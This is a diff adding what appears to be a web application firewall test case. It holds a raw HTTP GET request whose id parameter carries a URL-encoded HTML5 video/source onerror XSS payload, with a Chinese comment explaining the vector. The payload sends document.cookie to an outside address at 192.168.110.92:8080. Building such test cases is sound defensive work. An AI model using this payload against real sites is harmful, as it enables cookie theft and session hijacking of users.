@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_HTML5的向量_video-06506778
+# 通过 <VIDEO> 和 <SOURCE> 标签执行 JavaScript，如果由 <VIDEO> 标签封装，Opera 10.5+ 和 Chrome 允许在 <SOURCE> 标签中使用错误处理事件onerror。<AUDIO> 标签同样适用
+GET /?id=%3Cvideo%3E%3Csource%20onerror=%28location.href=%22http:%2F%2F192.168.110.92:8080%2Findex.jsp%3Fid=%22+document.cookie%29%3E&bid=hd_tag_m8mv25bs HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25bs
+RM-PRO-Token: cfe975d9f022827d8c28994ea2635165
+RM-PRO-Time: 1742808458192
+User-Agent: curl/7.83.1
+
